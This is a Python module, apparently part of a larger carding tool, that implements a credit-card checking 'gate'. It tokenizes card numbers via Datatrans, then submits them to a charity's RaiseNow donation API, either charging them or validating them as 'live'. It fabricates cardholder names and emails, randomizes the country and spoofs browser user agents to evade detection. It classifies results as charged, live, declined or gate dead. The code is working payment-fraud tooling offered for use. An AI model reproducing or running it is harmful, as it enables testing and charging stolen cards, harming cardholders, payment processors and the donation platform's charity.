import requests
import json
import random
import string
import logging

# Lấy logger để ghi lại các lỗi nếu cần
logger = logging.getLogger(__name__)

# --- NEW: DANH SÁCH CÁC MÃ QUỐC GIA ĐỂ CHỌN NGẪU NHIÊN ---
COUNTRY_CODES = [
    'CH', 'DE', 'AT', 'IT', 'FR', 'AF', 'AL', 'DZ', 'AS', 'AD', 'AO', 'AI', 'AQ', 'AG', 'AR', 'AM', 'AW', 'AZ', 'AU', 'BS', 
    'BH', 'BD', 'BB', 'BY', 'BE', 'BZ', 'BJ', 'BM', 'BT', 'BO', 'BA', 'BW', 'BV', 'BR', 'IO', 'BG', 'BF', 'BI', 'CL', 'CN', 
    'CO', 'CK', 'CR', 'DJ', 'DM', 'DO', 'DK', 'SV', 'CI', 'EC', 'ER', 'EE', 'FK', 'FJ', 'FI', 'TF', 'GF', 'PF', 'FO', 'GA', 
    'GM', 'GE', 'GH', 'GI', 'GD', 'GR', 'GB', 'GL', 'GP', 'GU', 'GT', 'GG', 'GN', 'GW', 'GY', 'HT', 'HM', 'HN', 'HK', 'IN', 
    'ID', 'IM', 'IQ', 'IR', 'IE', 'IS', 'IL', 'JM', 'JP', 'JE', 'JO', 'VG', 'VI', 'KY', 'KH', 'CM', 'CA', 'CV', 'KZ', 'QA', 
    'KE', 'KG', 'KI', 'CC', 'KM', 'CG', 'CD', 'XK', 'HR', 'CU', 'KW', 'LA', 'LS', 'LV', 'LB', 'LR', 'LI', 'LT', 'LU', 'LY', 
    'MO', 'MG', 'MW', 'MY', 'MV', 'ML', 'MT', 'MA', 'MH', 'MQ', 'MR', 'MU', 'YT', 'MK', 'MX', 'FM', 'MD', 'MC', 'MN', 'ME', 
    'MS', 'MZ', 'MM', 'NA', 'NR', 'NP', 'NC', 'NZ', 'NI', 'NL', 'NE', 'NG', 'NU', 'KP', 'MP', 'NF', 'NO', 'OM', 'PK', 'PW', 
    'PS', 'PA', 'PG', 'PY', 'PE', 'PH', 'PN', 'PL', 'PT', 'PR', 'RW', 'RO', 'RU', 'RE', 'KN', 'MF', 'SB', 'ZM', 'WS', 'SM', 
    'BL', 'SA', 'SE', 'SN', 'RS', 'SC', 'SL', 'ZW', 'SG', 'SK', 'SI', 'SO', 'ES', 'LK', 'SH', 'LC', 'PM', 'VC', 'SD', 'SR', 
    'SJ', 'SZ', 'SY', 'ST', 'GS', 'ZA', 'KR', 'TJ', 'TW', 'TZ', 'TH', 'TL', 'TG', 'TK', 'TO', 'TT', 'TD', 'CZ', 'TN', 'TM', 
    'TC', 'TV', 'TR', 'UG', 'UA', 'HU', 'UY', 'UZ', 'VU', 'VA', 'VE', 'AE', 'US', 'VN', 'WF', 'CX', 'BN', 'EH', 'YE', 'CF', 
    'CY', 'EG', 'GQ', 'ET', 'AX', 'UM', 'BQ', 'CW', 'SS', 'SX'
]

# --- HELPER FUNCTIONS (sẽ được truyền vào từ main.py nhưng định nghĩa ở đây để rõ ràng) ---
def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"
    
def random_user_agent():
    chrome_major = random.randint(100, 138)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message
# --- END HELPER FUNCTIONS ---


def check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate_mode_func, get_charge_value_func, custom_charge_amount=None):
    """
    Logic to check a card using Gate 5.
    This gate can operate in 'charge' or 'live' mode.
    """
    gate5_mode = get_gate_mode_func()
    
    try:
        # --- Generate Random Data ---
        ua = random_user_agent()
        first_name = generate_random_string(random.randint(8, 15))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        country = random.choice(COUNTRY_CODES) # Chọn quốc gia ngẫu nhiên

        # --- Step 1: Tokenize Card ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        
        tokenize_headers = {
            "Host": "pay.datatrans.com",
            "Accept": "*/*",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Pragma": "no-cache",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": ua,
            "X-Requested-With": "XMLHttpRequest"
        }
        
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250807181638869139", # formId for Gate 5
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877", # merchantId for Gate 5
            "browserUserAgent": ua,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)

        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # --- Step 2: Make Payment Request (Charge or Live) ---
        payment_headers = {
            "host": "api.raisenow.io",
            "accept": "application/json, text/plain, */*",
            "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://donate.raisenow.io",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://donate.raisenow.io/",
            "user-agent": ua
        }

        # Base payload structure from your request
        base_payload = {
            "account_uuid": "5f13f598-6eae-40af-b197-0da4b84aa7f3",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}},
                "country": country # Use random country
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "1000",
                    "suggested_amounts": "[1000,2000,5000]",
                    "user_agent": ua
                },
                "solution": {"uuid": "388f9be0-fb56-4e3a-a5f0-c676dc773df6", "name": "Godparent", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/tkgsf?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "custom_parameters": {
                "campaign_id": "Website", 
                "campaign_subid": "Godparent", 
                "rnw_recurring_interval_name": "monthly", 
                "rnw_recurring_interval_text": "Monthly"
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "e2bb1bce-d949-4987-8834-4a0770ee4f03",
            "return_url": "https://donate.raisenow.io/tkgsf?lng=en&rnw-view=payment_result",
            "subscription": {
                "custom_parameters": {"campaign_id": "Website", "campaign_subid": "Godparent", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"},
                "raisenow_parameters": {
                    "analytics": {"channel": "paylink", "preselected_amount": "1000", "suggested_amounts": "[1000,2000,5000]", "user_agent": ua},
                    "solution": {"uuid": "388f9be0-fb56-4e3a-a5f0-c676dc773df6", "name": "Godparent", "type": "donate"},
                    "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/tkgsf?lng=en", "uuid": "self-service", "version": "2.16.0"}
                },
                "recurring_interval": "7 * *",
                "timezone": "Asia/Bangkok"
            }
        }

        # --- Handle Charge vs Live Mode ---
        if gate5_mode == 'charge':
            charge_value = get_charge_value_func('5', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

        else: # Live Check Mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50} # Default value for live check

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 5 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 5 System Error: {e}", bin_info
